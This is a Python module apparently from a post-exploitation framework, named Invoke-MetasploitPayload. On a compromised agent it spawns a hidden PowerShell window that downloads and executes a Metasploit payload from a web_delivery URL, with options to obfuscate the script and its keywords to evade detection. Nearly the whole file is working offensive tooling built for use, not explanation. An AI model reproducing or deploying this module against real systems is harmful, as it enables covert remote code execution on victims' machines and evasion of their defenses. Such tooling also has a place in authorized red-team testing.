from __future__ import print_function
from builtins import str
from builtins import object
from lib.common import helpers
import threading

class Module(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-MetasploitPayload',
            'Author': ['@jaredhaight'],
            'Description': ('Spawns a new, hidden PowerShell window that downloads'
                            'and executes a Metasploit payload. This relies on the' 
                            'exploit/multi/scripts/web_delivery metasploit module.'),
            'Software': '',
            'Techniques': ['T1055', 'TA0001'],
            'Background' : False,
            'OutputExtension' : None,
            'NeedsAdmin' : False,
            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',

            'Comments': [
                'https://github.com/jaredhaight/Invoke-MetasploitPayload/'
            ]
        }

        self.options = {
            'Agent' : {
                'Description'   :   'Agent to run Metasploit payload on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'URL' : {
                'Description'   :   'URL from the Metasploit web_delivery module',
                'Required'      :   True,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu

        # used to protect self.http and self.mainMenu.conn during threaded listener access
        self.lock = threading.Lock()

        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        
        moduleSource = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-MetasploitPayload.ps1"
        if obfuscate:
            helpers.obfuscate_module(self.mainMenu , moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        scriptEnd = "\nInvoke-MetasploitPayload"

        for option,values in self.options.items():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value'])
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd

        # Get the random function name generated at install and patch the stager with the proper function name
        conn = self.get_db_connection()
        self.lock.acquire()
        script = helpers.keyword_obfuscation(script, conn)
        self.lock.release()

        return script
